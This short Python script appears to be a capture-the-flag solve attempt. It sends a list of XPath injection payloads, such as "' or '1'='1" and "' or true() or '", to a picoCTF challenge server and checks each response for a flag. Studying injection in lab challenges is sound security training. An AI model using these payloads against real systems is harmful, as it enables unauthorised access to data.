import requests
base = 'http://wily-courier.picoctf.net:49463'

# XPath injection tests in x parameter
payloads = [
    "' or '1'='1",
    "' or '1'='1'--",
    "' or 1=1 or '1'='1",
    '/*',
    "' and 1=1 and '",
    "' or true() or '",
    "' or 1=1",
    "test' and 1=1 and 'x'='x",
]
for p in payloads:
    r = requests.get(base, params={'x': p})
    print(f'x={p!r}')
    print(f'Length: {len(r.content)}')
    if 'picoCTF' in r.text or 'flag' in r.text.lower():
        print('FOUND:', r.text[:500])
    print('---')
    
# Also test trying to read files via XPath
r2 = requests.get(base, params={'x': "' or 1=1 and '1'='1"})
print('Second test length:', len(r2.content))